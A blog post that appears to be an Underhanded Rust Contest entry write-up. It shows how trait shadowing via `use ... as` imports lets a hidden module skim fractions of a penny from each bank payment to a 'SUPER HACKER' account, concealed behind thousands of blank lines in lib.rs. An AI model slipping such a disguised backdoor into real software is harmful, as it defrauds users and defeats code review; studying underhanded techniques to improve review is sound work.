---
layout: post
title:  "The 2016 Underhanded Rust Contest. Poisoned with module import."
date:   2017-01-11 11:00:00 -1000
categories: underhanded
lang: en-US
---

To increase my chances in [Underhanded Rust](https://underhanded.rs) i wrote another
simple web-server, that has a small defect. It quietly carves out fractions of a penny 
from each transaction into an account used by SUPER HACKER. To make it i
used Rust Module Import System.

There are [Crates and Modules chapter](https://doc.rust-lang.org/stable/book/crates-and-modules.html) and [Traits chapter](https://doc.rust-lang.org/stable/book/traits.html) in the Rust Book.

# Ideas

The first idea, that came to me, was "different traits can have the 
same named functions". So we can do something like this:
```ignore
mod a {
    pub struct Person;
    pub trait Bank {
        fn pay(&self);
    }
    impl Bank for Person {
        fn pay(&self) {
            println!("Payedddd to bank!!");
        }
    }
}

mod b {
    use a;
    pub trait Bank {
        fn pay(&self);
    }
    impl<T> Bank for T
        where T: a::Bank
    {
        fn pay(&self) {
            println!("Hacked!");
            <Self as a::Bank>::pay(self);
        }
    }
}

fn main() {
    // use a::Bank;
    use b::Bank;
    let p = a::Person {};
    p.pay();
}
```
But in this case used trait is not hidden and the reviewing guy
could say "busted!" and put poor programmer in jail or hire in Microsoft.

So to hide it i tried to use `as` keyword and it works. It has very
tricky behaviour. It doesn't work in other `use` statements, but works
in another code. So if we change main function, it is still be working:

```ignore
fn main() {
    use a as c;
    use c::Bank;
    let p = c::Person {};
    p.pay();
}

```
Notice that `c::Bank` and `c::Person` are seemed to be imported from one
module - `a`. But that's not true.

# Technichal part

The technichal part is also not so excited. I found nothing better than
put exploited module in lib.rs and separate it from other code by thousands 
of empty lines. -,-

The module looks like this:

```ignore
mod bank {
    use mybank;
    use mybank::{Person, Payment};
    use rustc_serialize::json::Json;


    pub trait Service {
        fn add_payment(&mut self, pay: Payment) -> String;
        fn add_customer(&mut self, customer: Person) -> String;
        fn get_account_info(&mut self, customer: Person) -> String;
    }

    impl<T> Service for T
        where T: mybank::Service
    {
        fn add_customer(&mut self, customer: Person) -> String {
            <Self as mybank::Service>::add_customer(self, customer)
        }

        fn add_payment(&mut self, pay: Payment) -> String {
            let hacker = Person {
                firstname: "SUPER".to_string(),
                lastname: "HACKER".to_string(),
            };
            let acc_info = <Self as mybank::Service>::get_account_info(self, hacker.clone());
            let json = Json::from_str(&acc_info).unwrap();
            let account = json["account"].as_string().unwrap().to_string();
            let hacker_pay = Payment {
                customer: hacker,
                account: account,
                amount: 0.00001f64,
            };
            println!("Hacked!");
            <Self as mybank::Service>::add_payment(self, hacker_pay);
            let corrected_pay = Payment {
                customer: pay.customer,
                account: pay.account,
                amount: pay.amount - 0.00001f64,
            };
            <Self as mybank::Service>::add_payment(self, corrected_pay)
        }

        fn get_account_info(&mut self, customer: Person) -> String {
            <Self as mybank::Service>::get_account_info(self, customer)
        }
    }
}
```

On server side i used these imports:

```ignore
use mybank as bank;
use bank::Service;
```

# The End 

Poisoned module pays salary to SUPER HACKER and reviewing guy is happy, because
there are no errors and everything seems working great.

Thanks 2 $)
